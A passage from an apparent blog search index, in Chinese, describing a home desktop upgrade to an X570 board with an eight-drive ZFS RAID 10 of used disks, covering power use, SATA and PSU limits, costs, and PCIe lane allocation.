\u4e2d\u53e6\u4e00\u5757\u76d8\u7684\u6570\u636e\uff0c\u6570\u636e\u91cf\u5f88\u5c0f\u3002\u7b2c\u4e8c\u662f raid 10 \u8fdc\u6bd4\u5176\u5b83 raid \u7075\u6d3b\u3002raid 10 \u4e24\u5757\u786c\u76d8\u4e3a 1 \u7ec4\uff0c\u53ea\u9700\u8981\u4fdd\u8bc1\u4e24\u5757\u786c\u76d8\u5bb9\u91cf\u76f8\u540c\u5373\u53ef\u3002\u800c\u5176\u5b83 raid \u5747\u9700\u8981\u6240\u6709\u76d8\u5bb9\u91cf\u76f8\u540c\uff0c\u8fd9\u610f\u5473\u7740\u6211\u5f97\u4e00\u6b21\u6027\u628a\u6240\u6709\u7684\u76d8\u90fd\u4e70\u6765\uff0c\u800c\u4e00\u5757 14T \u7684\u4f01\u4e1a\u76d8\u9700\u8981\u4e00\u5343\u591a\uff0c3-4 \u5757\u4e00\u6b21\u8d2d\u5165\u663e\u7136\u6210\u672c\u592a\u9ad8\u3002\u53e6\u5916\uff0craid 10 \u540e\u7eed\u6269\u5bb9\u4e5f\u975e\u5e38\u5bb9\u6613\uff0c\u63d2\u5165\u5373\u53ef\u6269\u5bb9\u3002\u800c\u5176\u5b83 raid \u5219\u9700\u8981\u91cd\u5efa\u6574\u4e2a\u9635\u5217\uff0c\u975e\u5e38\u8d39\u65f6\u3002</p> <p>\u8fd9\u7bc7\u6587\u7ae0\u4e3b\u8981\u8bb0\u5f55\u4e0b\u786c\u4ef6\u7684\u5347\u7ea7\u70b9\uff0c\u4ee5\u53ca\u4eba\u751f\u7b2c\u4e8c\u6b21\u88c5\u673a\u603b\u7ed3\u7684\u4e00\u4e9b\u7ecf\u9a8c\u3002</p> <p>epilogue</p> <p>\u7ecf\u8fc7 1 \u5468\u7684\u89c4\u5212\u4e0e\u5b9e\u8df5\uff0c\u53f0\u5f0f\u673a\u7ec8\u4e8e\u5347\u7ea7\u5b8c\u6210\u3002\u73b0\u5728\u5b83\u771f\u7684\u6210\u4e86\u4e00\u4e2a all in one \u5b8c\u5168\u4f53\u4e86</p> <ul> <li>AMD 5800x + 96 GB \u5185\u5b58\uff0cPVE \u7cfb\u7edf</li> <li>\u62e5\u6709 1G, 2.5G \u53cc\u7f51\u5361\uff0c\u642d\u5efa\u4e86 openwrt \u8f6f\u8def\u7531</li> <li>\u62e5\u6709 zotac GTX 1063, \u516c\u7248 GTX 1070 \u53cc\u663e\u5361\uff0c\u5206\u522b\u76f4\u901a\u7ed9 linux \u548c windows \u4e24\u4e2a\u865a\u62df\u673a\u7cfb\u7edf\u3002</li> <li>\u63d2\u6ee1 8 \u5757\u673a\u68b0\u786c\u76d8\uff0c\u63d0\u4f9b 6T + 8T (6 \u76d8 zfs raid 10) \u7684\u5b58\u50a8\u7a7a\u95f4</li> </ul> <p>\u7136\u800c\u4e5f\u6709\u4e00\u4e9b\u4e4b\u524d\u6ca1\u6709\u8003\u8651\u5230\u7684\uff1a</p> <ul> <li>\u6ca1\u60f3\u5230\u6362\u4e3b\u677f\u3001\u673a\u7bb1\u662f\u4e00\u4ef6\u975e\u5e38\u8d39\u65f6\u8d39\u529b\u7684\u4e8b\u60c5\uff0c\u4ece\u4e0b\u5348 3 \u70b9\u641e\u5230\u4e86\u665a\u4e0a 11 \u70b9\u3002\u9047\u5230\u95ee\u9898\u6709\uff1a\u6e05\u6d17\u603b\u5171 9 \u628a\u98ce\u6247\u592a\u8d39\u65f6\u3002\u63d2\u7535\u5f00\u673a\u6ca1\u6709\u4e00\u6b21\u70b9\u4eae\uff0c\u5dee\u70b9\u4ee5\u4e3a\u4e3b\u677f\u7ffb\u8f66\u3002\u8fdb BIOS \u540e\u7cfb\u7edf\u8fd8\u8981\u4fee\u590d\u5f15\u5bfc\uff0czfs \u4f5c\u4e3a root \u5206\u533a\u4e0d\u592a\u719f\u6089\u7b49\u3002</li> <li>\u529f\u8017\u9ad8\u4e86 70 w\uff0c\u4ece 130 w -&gt; 200 w\uff0c\u4ece\u6bcf\u65e5 3.3 \u5ea6\u6da8\u5230 4.4 \u5ea6\u3002\u8d2d\u4e70\u786c\u76d8\u65f6\u6ca1\u6709\u8003\u8651\u5230\u786c\u76d8\u7684\u529f\u8017\uff0c\u6ca1\u60f3\u5230\u786c\u76d8\u529f\u8017\u53ef\u4ee5\u6709 1 \u500d\u7684\u5dee\u8ddd\uff08\u6700\u4f4e 4.4 w\uff0c\u6700\u9ad8 8.0 w\uff09\u3002\u5f53\u6709 8 \u5757\u786c\u76d8\u65f6\uff0c\u603b\u7684\u5dee\u8ddd\u5c31\u53ef\u4ee5\u76f8\u5dee 20-30 w\u3002<ul> <li>AMD PBO2 \u7684\u964d\u538b\u529f\u80fd\u975e\u5e38\u91cd\u8981\uff0c\u5f00\u4e0e\u4e0d\u5f00\u529f\u8017\u76f8\u5dee\u53ef\u80fd 50 w</li> </ul> </li> </ul> <p>Update 2024/10/31</p> <ul> <li>\u7a81\u7136\u89c9\u5f97\u786c\u76d8\u4f4d\u4e0d\u662f\u8d8a\u591a\u8d8a\u597d\u4e86\uff0c\u5176\u5b9e HC520 \u8fd9\u79cd 12 T \u7684\u76d8\uff0c\u5355\u4f4d\u5bb9\u91cf\u4ef7\u683c\u662f\u4e00\u6837\u7684\uff08\u751a\u81f3\u66f4\u4f4e\uff09\u3002\u90a3\u4e48\u7ec4\u5c11\u6570\u51e0\u5757\u5927\u5bb9\u91cf\u7684\u76d8\u548c\u7ec4\u591a\u5757\u76d8\u5c0f\u5bb9\u91cf\u7684\u76d8\u603b\u4ef7\u683c\u662f\u4e00\u6837\u7684\u3002<ul> <li>\u7ec4\u5c0f\u5bb9\u91cf\u76d8<ul> <li>\u4f18\u70b9\uff1a<ul> <li>\u5355\u6b21\u8d2d\u5165\u4ef7\u683c\u4f4e\u3002\u589e\u52a0 4 T \u7a7a\u95f4\uff0c\u9700\u8981 400 \u5143\uff0c\u80fd\u591f\u627f\u53d7</li> <li>\u76d8\u66f4\u591a\uff0cRAID \u901f\u5ea6\u66f4\u5feb\u3002\u5355\u5757\u673a\u68b0\u76d8\u53ef\u80fd\u53ea\u6709 200-300MB\u30026 \u76d8 RAID10 \u53ef\u4ee5\u8fbe\u5230 600-700MB\u3002</li> </ul> </li> <li>\u7f3a\u70b9\uff1a<ul> <li>\u90e8\u4ef6\u8d8a\u591a\uff0c\u8d8a\u5bb9\u6613\u574f\uff0c\u7ef4\u62a4\u6210\u672c\u4e0a\u5347</li> </ul> </li> </ul> </li> <li>\u7ec4\u5927\u5bb9\u91cf\u76d8<ul> <li>\u4f18\u70b9\uff1a<ul> <li>\u7ef4\u62a4\u66f4\u5bb9\u6613\uff0c\u6bd4\u5982 4 \u5757 12T \u76d8\uff0c\u5bb9\u91cf\u6709 24T\uff0c\u5374\u53ea\u9700\u8981 4 \u5757\u76d8\u3002</li> <li>\u6361\u5783\u573e\u66f4\u597d\u6361\uff1f\u6bd5\u7adf\u670d\u52a1\u5668\u603b\u6709\u9000\u5f79\u4e0b\u6765\u7684\u76d8</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u5355\u7b14\u82b1\u8d39\u5de8\u5927\u3002\u7ec4 raid10 \u8d77\u7801 4 \u5757\u76d8\uff0c10 T \u8d77\u6b65\uff0c\u5f00\u9500\u8fbe\u5230 4 x 550 = 2200 \u7ea7\u522b\uff0c\u76f8\u5f53\u4e8e\u4e70\u5f20\u65b0\u663e\u5361\u4e86\u3002\u5b66\u751f\u515a\u57fa\u672c\u627f\u53d7\u4e0d\u8d77\uff0c\u5de5\u4f5c\u4e86\u4f5c\u4e3a\u4e00\u6b21\u6027\u6295\u5165\u5012\u662f\u9002\u5408\u3002</li> </ul> </li> </ul> </li> </ul> </li> <li>\u6240\u4ee5\u611f\u89c9 8 \u76d8\u4f4d\u5df2\u7ecf\u662f\u5bb6\u7528\u6700\u9002\u5408\u7684\u6570\u76ee\u4e86\uff0c\u6269\u5c55\u4f1a\u9047\u5230\u5f88\u591a\u95ee\u9898</li> <li>SATA \u6570\u636e\u63a5\u53e3\u4e0d\u591f\uff1a\u6211\u7684 X570 \u6709 8 \u4e2a SATA \u53e3\uff0c\u8fd9\u4e5f\u662f\u5bb6\u7528\u4e3b\u677f\u57fa\u672c\u4e0a\u6700\u9ad8\u7684\u6570\u76ee\u4e86\u3002\u867d\u7136\u53ef\u4ee5\u901a\u8fc7 PCIeX1 \u8f6c SATA\uff0c\u4f46\u662f\u8fd9\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff1a     - PCIeX1 \u8f6c\u63a5\u5361\u4ef7\u683c\u5e76\u4e0d\u4fbf\u5b9c\uff0c\u8f6c 4 \u4e2a SATA \u9700\u8981 80-100 \u5143     - \u5f88\u591a mATX \u4e3b\u677f PCIeX1 \u69fd\u4e0d\u591a\uff1aPCIeX1 \u53ef\u80fd\u548c\u7b2c\u4e8c\u4e2a\u663e\u5361\u69fd\u5171\u4eab\u901a\u9053\uff0c\u63d2\u4e86\u663e\u5361\u5c31\u8981\u964d\u901f\uff08\u6bd4\u5982\u53d8\u6210 x2 \u901a\u9053\u6570\uff09\u3002\u53e6\u5916 PCIe \u8fd8\u53ef\u80fd\u7528\u4e8e\uff1a\u63a5\u65e0\u7ebf\u7f51\u5361\u3001\u63a5\u4e07\u5146\u7f51\u5361\u3002\u56e0\u6b64 PCIe \u69fd\u5f80\u5f80\u662f\u4e0d\u591f\u7528\u7684<ul> <li>\u673a\u7bb1\u663e\u5361\u9650\u957f\u95ee\u9898\uff1a\u534a\u5c9b\u94c1\u76d2F20 \u6b63\u9762\u6709 8 \u4e2a\u786c\u76d8\u4ed3\uff0c\u80cc\u9762\u8fd8\u6709 2 \u4e2a\u3002\u5bf9\u4e8e\u663e\u5361\u9650\u957f\u7684\u95ee\u9898\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u79fb\u9664\u524d\u9762\u7684\u786c\u76d8\u7b3c\u89e3\u51b3\u3002\u800c\u63d2\u6ee1\u7684\u60c5\u51b5\u4e0b\u8bdd\u5c31\u9ebb\u70e6\u4e86\u3002</li> <li>SATA \u4f9b\u7535\u63a5\u53e3\u6570\u91cf\uff1a\u6211\u7684\u5b89\u949b\u514b 650 W \u7535\u6e90\uff0c\u63d0\u4f9b\u4e86 2 \u6761 P6 \u8f6c 4 \u4e2a SATA \u7684\u7535\u6e90\u7ebf\u3002\u63d2 8 \u4e2a\u76d8\u6b63\u597d\uff0c\u63d2 10 \u4e2a\u5219\u53e6\u9700\u8d2d\u5165 SATA 1 \u5206\u591a \u7535\u6e90\u7ebf\uff0c\u6709\u70b9\u9ebb\u70e6\u3002\uff08\u4e0d\u8fc7\u4ef7\u683c\u53ea\u898110 \u5143\uff0c\u53e6\u5916\u6211\u7684\u7535\u6e90\u8fd8\u6709 P6 \u662f IDE \u7684\u7535\u6e90\u7ebf\uff0c\u4e5f\u53ef\u4ee5\u8d2d\u4e70 IDE \u8f6c SATA \u7535\u6e90\u7ebf\u3002\u56e0\u6b64\u7535\u6e90\u63a5\u53e3\u65b9\u9762\uff0c\u6781\u9650\u786c\u76d8\u6570\u4e3a 12 \u4e2a\uff09</li> <li>\u7535\u6e90 12v \u529f\u7387\u95ee\u9898\uff1a\u673a\u68b0\u786c\u76d8\u542f\u52a8\u65f6\u9700\u8981\u4f7f\u7528 12v\uff0c\u7535\u6d41\u53ef\u4ee5\u8fbe\u5230 2A\uff0c\u56e0\u6b64\u5355\u76d8\u6709 24W\uff0c8 \u5757\u76d8\u5c31\u662f 192 W\uff0c12 \u5757 288 W\uff0c16 \u5757 384 W\uff0c20 \u5757 480 W\uff0c\u8fd9\u8fd8\u4e0d\u5305\u62ec CPU \u548c\u663e\u5361\u529f\u7387\uff08\u867d\u7136\u5f00\u673a\u65f6\u663e\u5361\u529f\u7387\u53ef\u80fd\u4e0d\u9ad8\uff09\u3002\u56e0\u6b64\u591a\u5757\u786c\u76d8\u9700\u8981\u8003\u8651\u7535\u6e90 12v \u529f\u7387\uff08\u7535\u6e90\u529f\u7387\u662f\u5206\u5f00\u7684\uff0c\u6709 3.3v, 5v, 12v\uff09\u662f\u5426\u8fbe\u6807\uff0c\u786c\u76d8\u662f\u4e0d\u80fd\u65e0\u9650\u53e0\u52a0\u7684\u3002<ul> <li>\u4f7f\u7528 1 \u5206\u591a\u7684\u7ebf\u65f6\u8fd8\u8981\u8003\u8651\u5355\u6761\u7ebf\u627f\u8f7d\u7684\u7535\u6d41\uff0c\u56e0\u6b64\u4e5f\u4e0d\u80fd\u5206\u592a\u591a\uff08\u53c2\u8003\u540e\u9762\u663e\u5361 6 pin \u4f9b\u7535\u53ea\u80fd\u627f\u8f7d 12A\uff0c\u611f\u89c9 1 \u5206 4 \u662f\u6bd4\u8f83\u7a33\u59a5\u7684\uff0c1 \u5206 6 \u611f\u89c9\u5c31\u6709\u70b9\u98ce\u9669\u4e86\uff09</li> </ul> </li> </ul> </li> <li>\u6240\u4ee5\u6211\u73b0\u5728\u7684\u7b56\u7565\u662f\uff0c\u7ef4\u6301 8 \u5757\u76d8\u4e0d\u53d8\uff0c\u9010\u6b65\u628a\u5c0f\u76d8\u6362\u6210\u5927\u76d8\u3002<ul> <li>\u76ee\u524d\u7ed3\u6784 4+3+(2+3+3)x2\uff0cRAID \u4e2d 1 \u5757 3T \u6709\u62a5\u9519\u3002\u7531\u4e8e\u76d8\u8fd8\u6ca1\u574f\uff0c\u574f\u4e86\u53ef\u4ee5\u7acb\u9a6c\u7528\u5916\u9762\u7684 3 T \u66ff\u6362\uff0c\u56e0\u6b64\u4e0d\u592a\u62c5\u5fc3\uff0c\u8fd8\u53ef\u4ee5\u82df\u4e00\u82df\u3002</li> <li>\u7b49\u574f\u4e86\u4e4b\u540e\uff0c\u5c31\u7a7a\u51fa\u4e86 1 \u4e2a\u786c\u76d8\u4f4d\u3002\u6b64\u65f6\u53ef\u4ee5\u518d\u8d2d\u5165 1 \u5757 4 T \u7684\uff0c\u548c\u539f\u672c\u5355\u72ec\u7684 4T \u6784\u6210\u4e00\u4e2a\u7ec4\uff0c\u7136\u540e\u66ff\u6362\u539f\u6765\u7684 2T \u7684\u7ec4\uff0c\u66ff\u6362\u51fa\u6765\u7684 2 T \u653e\u5728\u5916\u9762\u3002<ul> <li>(4+3+3)x2 + 2 + 2</li> </ul> </li> <li>\u5e0c\u671b\u4e0b\u6b21\u574f\u5c31\u662f 2 T \u7684\u4e86\uff0c\u8fd9\u6837\u53c8\u53ef\u4ee5\u8d2d\u5165\u5927\u76d8</li> </ul> </li> <li>\u4e0a\u9762\u7684\u5347\u7ea7\u7b56\u7565\u611f\u89c9\u8fd8\u633a\u5de7\u5999\u7684\uff0c\u5f53\u6211\u4eec\u60f3\u8981\u5347\u7ea7 RAID10 \u7ec4\u7684\u5bb9\u91cf\u65f6\uff1a<ul> <li>\u5982\u679c\u4f7f\u7528\u6734\u7d20\u7684\u5347\u7ea7\u7b56\u7565<ul> <li>\u4e00\u6b21\u6027\u8d2d\u5165\u4e24\u5757\u5927\u76d8\uff0c\u66ff\u6362\u6389\u539f\u6765\u7684\u4e00\u7ec4 RAID\uff0c\u8fd9\u6837\u5c31\u4f1a\u591a\u51fa\u4e24\u5757\u76d8\uff0c\u9700\u8981\u6709\u989d\u5916\u7684\u7a7a\u95f2\u786c\u76d8\u4f4d\u3002\u800c\u4e8c\u624b\u51fa\u673a\u68b0\u786c\u76d8\u611f\u89c9\u8fd8\u662f\u633a\u9ebb\u70e6\u7684\u3002</li> </ul> </li> <li>\u800c\u4f7f\u7528\u6211\u7684\u7b56\u7565\uff1a<ul> <li>\u7ef4\u62a4\u82e5\u5e72\u975e RAID \u76d8\u4f4d \uff08\u6bd4\u5982 \u91c7\u7528 6 raid + 2 \u975e raid\uff0c\u6216\u8005 8 + 4 \u5e03\u5c40\uff09</li> <li>\u975e RAID \u76d8\u4f4d\u53ef\u4ee5\u7ef4\u62a4\u4e00\u4e2a\u5927\u76d8\uff0c\u7528\u4e8e\u5e73\u65f6\u975e\u5173\u952e\u6570\u636e\u5b58\u50a8\u3002\u8fd9\u6837\u5c31\u80fd\u7528\u4e00\u534a\u7684\u4ef7\u683c\u4eab\u53d7\u5927\u5bb9\u91cf\u5b58\u50a8</li> <li>\u5f53 RAID \u76d8\u4f4d\u6709\u76d8\u635f\u574f\u65f6\uff0c\u6b64\u65f6\u518d\u8d2d\u5165\u4e00\u5757\u5927\u76d8\u7ec4\u6210\u4e00\u7ec4\uff0c\u66ff\u6362 RAID \u6709\u635f\u574f\u7684\u7ec4\uff0c\u5c0f\u76d8\u5c31\u653e\u5230\u5916\u9762\u7ee7\u7eed\u5de5\u4f5c\u3002\u53ef\u4ee5\u53d1\u73b0\u4e0a\u8ff0\u64cd\u4f5c\u4e0d\u9700\u8981\u989d\u5916\u7684\u786c\u76d8\u4f4d\uff0c\u76f8\u5f53\u4e8e\u539f\u5730\u5347\u7ea7\u3002\u800c\u4e14\u5c0f\u76d8\u7531\u4e8e\u5de5\u4f5c\u65f6\u95f4\u66f4\u957f\uff0c\u56e0\u6b64\u4e0b\u6b21\u66f4\u6709\u53ef\u80fd\u574f\u6389\uff0c\u800c\u574f\u6389\u5c31\u53c8\u53ef\u4ee5\u7a7a\u51fa\u4e00\u4e2a\u7a7a\u95f2\u76d8\u4f4d\u4e86\u3002\u8fd8\u60f3\u8981\u5347\u7ea7\u7684\u8bdd\uff0c\u53ef\u4ee5\u7ee7\u7eed\u8d2d\u5165\u6bd4 RAID10 \u7ec4\u4e2d\u6700\u5c0f\u76d8\u5927\u7684\u76d8\uff0c\u7b49\u5f85\u4e0b\u6b21\u5347\u7ea7\u5373\u53ef\u3002</li> </ul> </li> </ul> </li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u524d\u540e\u786c\u4ef6\u5bf9\u6bd4","title":"\u524d\u540e\u786c\u4ef6\u5bf9\u6bd4","text":"<p>before </p> <p>later </p>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u786c\u4ef6\u8d2d\u4e70","title":"\u786c\u4ef6\u8d2d\u4e70","text":"","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u5b9e\u9645\u5f00\u9500","title":"\u5b9e\u9645\u5f00\u9500","text":"<ul> <li>\u673a\u7bb1\uff1aF20 \u534a\u5c9b\u94c1\u76d2\u673a\u7bb1\uff1a190</li> <li>\u4e3b\u677f\uff1aROG x570-E: 770 (20\u8fd0\u8d39)<ul> <li>\u534e\u7855 b550m plus wifi\u4e8c\u624b\u51fa\u6389\uff1a480</li> </ul> </li> <li>\u786c\u76d8\uff08\u4e70\u4e86 6 \u5757\uff0c\u539f\u672c\u6709 2 T + 4 T \u4e24\u5757\uff09<ul> <li>3T: 150<ul> <li>ST3000DM001-1CH166, date: 15274, 45736h, 836\u6b21</li> </ul> </li> <li>2x3T: 330<ul> <li>st3000dm001, DOM: 140CT2016, 10537h, 237\u6b21,</li> <li>st3000dm001, DOM: 140CT2016, 12438h, 238\u6b21</li> </ul> </li> <li>2x3T: 326<ul> <li>st3000dm008, DOM: 09APR2018, 37764h, 5353\u6b21</li> <li>st3000dm008, DOM: 09APR2018, 38368h, 7024\u6b21</li> </ul> </li> <li>1x2T: 110<ul> <li>WD20EJRX, 2018-05-12</li> </ul> </li> </ul> </li> </ul> <p>\u5408\u8ba1</p> <ul> <li>\u4e3b\u677f\u673a\u7bb1\uff1a190 + (770 - 480) = 480</li> <li>\u786c\u76d8\uff1a330 + 436 + 150 = 916</li> <li>\u603b\u5171\uff1a1396</li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u534e\u7855rog-x570-e-\u4e3b\u677f\u8be6\u60c5","title":"\u534e\u7855ROG x570-E \u4e3b\u677f\u8be6\u60c5","text":"","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u5347\u7ea7\u7684\u5730\u65b9\u603b\u7ed3","title":"\u5347\u7ea7\u7684\u5730\u65b9\u603b\u7ed3","text":"<p>\u4ece B550m \u6362\u6210 X570 \u603b\u7ed3</p> <ol> <li>\u53cc\u663e\u5361\u53d8\u53cb\u597d\u4e86<ul> <li>\u539f\u672c\u4e24\u4e2a x16 \u69fd\u7684\u95f4\u8ddd\u53ea\u6709 2 \u4e2a slot\uff0c\u4e24\u4e2a\u663e\u5361\u521a\u597d\u8d34\u5728\u4e86\u4e00\u8d77\uff08\u5f88\u6781\u9650\uff0c\u6709\u7684 2 \u69fd\u5bbd\u663e\u5361\u53ef\u80fd\u5c31\u65e0\u6cd5\u63d2\u8fdb\u53bb\u4e86\uff09\uff0c\u5f71\u54cd\u4e86\u6563\u70ed\u3002\u73b0\u5728\u9694\u4e86 3 \u4e2a slot\uff0c\u5c31\u5f88\u5408\u9002\u4e86\u3002</li> <li>\u539f\u672c\u7684\u4e3b\u677f\u6709\u4e24\u4e2a x16 \u69fd\uff0c\u7b2c\u4e00\u4e2a\u901a\u9053\u6570\u6765\u81ea CPU\uff0c \u56fa\u5b9a\u662f 4.0 x 16 \u4e25\u91cd\u6d6a\u8d39\u3002\u800c\u7b2c\u4e8c\u4e2a x16 \u6765\u81ea\u82af\u7247\u7ec4\u53ea\u6709 3.0 x 4 \u53c8\u4e0d\u592a\u591f\u3002\u73b0\u5728\u5c06\u7684\u4e24\u4e2a x16 \u69fd\u7684\u901a\u9053\u6570\u90fd\u6765\u81ea CPU\uff0c x8 \u7684\u901a\u9053\u6570\u5c31\u6bd4\u8f83\u5408\u9002\u3002\u867d\u7136 N \u5361\u4ece 30 \u7cfb\uff0cA \u5361\u4ece 5000xt\u624d\u5f00\u59cb\u652f\u6301 4.0\uff0c\u4e0d\u8fc7 3.0 x 8 \u5bf9\u6211\u7684 1070 \u6765\u8bf4\u8fd8\u662f\u591f\u7528\u7684</li> </ul> </li> <li>SATA \u63a5\u53e3\u4ece 4 \u4e2a\u53d8\u4e3a 8 \u4e2a\u3002\u5bf9\u4e8e\u642d\u5efa\u80fd\u591f\u7ec4 RAID \u7684 NAS \u6765\u8bf4\u591f\u7528\u4e86</li> <li>\u6240\u6709 chipset \u8fde\u63a5\u7684 PCIE \u90fd\u53d8\u6210\u4e86 4.0\u3002\u6bd4\u5982 \u7b2c\u4e8c\u6761 m.2\uff0c\u7b2c\u4e09\u6761 x16 slot\u7b49<ul> <li>\u5168\u90e8\u90fd\u662f\u9ad8\u901f\u63a5\u53e3\uff0c\u6bd4\u5982\u80cc\u9762\u6709 8 \u4e2a 10GB \u7684USB3.2 Gen2\u63a5\u53e3</li> </ul> </li> <li>\u81ea\u5e26\u4e00\u4e2a 1G \u7684\u7f51\u5361\uff0c\u548c\u4e00\u4e2a 2.5 G \u7684\u7f51\u5361 (RTL8125)\uff0c\u7ec4\u8f6f\u8def\u7531\u53d8\u65b9\u4fbf\u4e86</li> </ol>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#x570-pci-e-\u901a\u9053\u5206\u914d","title":"x570 PCI-E \u901a\u9053\u5206\u914d","text":"<p>AMD Ryzen 7 5800X3D review (Page 3) (guru3d.com)</p> <ul> <li>\u8fd9\u4e2a\u56fe\u76ee\u524d\u8fd8\u662f\u6709\u4e00\u4e9b\u4e0d\u592a\u7406\u89e3\u7684\u5730\u65b9\uff0c\u6839\u636e\u6211\u591a\u65b9\u6574\u5408\u7684\u6d88\u606f\uff0c\u4ee5\u4e0b\u60c5\u51b5\u662f\u66f4\u7b26\u5408\u5b9e\u9645\u7684<ul> <li>AMD 5000\u7cfb CPU \u6709 20 \u6761pcie 4.0 \u901a\u9053\uff0c16 \u6761\u7ed9\u663e\u5361\uff0c4 \u6761\u7ed9m.2 \uff08\u8fd8\u6709 4 \u6761\u8fde\u63a5 chipset \u4e0d\u7b97\uff09\u3002CPU \u8fd8\u96c6\u6210\u4e86 4 \u4e2a 10GB USB3.2</li> <li>X570 \u82af\u7247\u7ec4\u7684\u90e8\u5206\u5c31\u5f88\u96be\u7406\u89e3\u4e86\uff0c\u56fe\u4e2d\u611f\u89c9\u6807\u4e86 8 + 4 + 4 = 16 \u6761\u901a\u9053\u3002\u4f46\u662f\u6211\u7684 X570-E gaming \u4e3b\u677f\u53ea\u6709 9 \u6761\u3002</li> </ul> </li> </ul> <p></p> <p>!!! note \u201c\u4e00\u4e9b\u51b7\u95e8\u77e5\u8bc6\"</p> <pre><code>  x570 \u82af\u7247\u7ec4\u548c 5000\u7cfbCPU\u4e2d\u7684io die\u57fa\u672c\u4e00\u6837\uff0c\u90fd\u662fAMD\u8bbe\u8ba1\u7684\u3002\u4e0d\u540c\u7684\u662fCPU\u4e2d\u7684\u91c7\u752812nm\uff0c\u800c\u82af\u7247\u7ec4\u4e3a14nm\u3002\n</code></pre> <p>X570-E \u4e3b\u677f pcie \u6269\u5c55\u69fd\u6570\u91cf\u548c\u4f4d\u7f6e</p> <ul> <li>3 \u4e2a pciex16 + 2 \u4e2a pciex1 </li> </ul> <p>\u901a\u9053\u5206\u914d \u53c2\u8003\uff1a[SUPPORT] ROG STRIX X570-E/F PCIe lane assignment : r/ASUS</p> <ul> <li>PCIeX16_1 \u548c PCIeX16_2 \u90fd\u6765\u81ea CPU \u7684 16 \u901a\u9053\uff0c\u540c\u65f6\u4f7f\u7528\u65f6\u62c6\u5206\u6210\u4e24\u4e2a x8</li> <li>M.2_1 \u6765\u81ea CPU \u7684 4 \u901a\u9053</li> <li>x570 \u6709 9 \u6761 pcie 4.0 \u901a\u9053\uff08\u8fde\u63a5 CPU \u7684 4 \u6761\u4e0d\u7b97\uff09\uff0c x570-E \u4e3b\u677f\u7684\u5206\u914d\u662f\uff0c4 \u6761\u7ed9 PCIeX16_3\uff0c4 \u6761\u7ed9 M.2_2\uff0c1 \u6761 \u7ed9 PCIeX1_1\u3002PCIeX1_2 \u548c PCIeX16_3 \u5171\u4eab\uff0c\u540c\u65f6\u4f7f\u7528\u65f6 PCIeX16_3 \u53d8\u4e3a x2\uff0c\u56e0\u6b64\u4f1a\u635f\u5931 1 \u4e2a\u901a\u9053</li> </ul> <p></p>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u4e3b\u677f-manual","title":"\u4e3b\u677f manual","text":"<p>B550M: E17266_TUF_GAMING_B550M-PLUS_WI-FI_UM_v2_WEB.pdf (asus.com.cn)</p> <p>x570\uff1aE15826_ROG_STRIX_X570-E_GAMING_UM_v2_WEB.pdf (asus.com.cn) ROG Strix X570-E Gaming | Motherboards | ROG Global (asus.com)</p> <p></p> <p></p>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u5c3e\u90e8-io","title":"\u5c3e\u90e8 I/O","text":"<ul> <li>2.5G \u4ee5\u592a\u7f51\uff1aRealtek RTL8125-CG</li> <li>WiFi 6\uff1aintel i211AT, bluetooth 5.0</li> <li>\u89c6\u9891<ul> <li>hdmi 2.0b: 4K@60 \uff08\u53ef\u60dc\u4e0d\u662f 2.1 \u7684 8K@60\uff09</li> <li>dp 1.2: 4K@60</li> </ul> </li> <li>\u97f3\u9891<ul> <li>7\uff1a\u4e00\u79cd\u9ad8\u4fdd\u771f\u7684\u97f3\u9891\u63a5\u53e3\u3002S/PDIF - \u7ef4\u57fa\u767e\u79d1 --- S/PDIF - Wikipedia</li> <li>5.1 \u901a\u9053\u8fde\u63a5\u65b9\u5f0f\uff0c\u9700\u89813\u4e2a\u626c\u58f0\u5668 </li> </ul> </li> 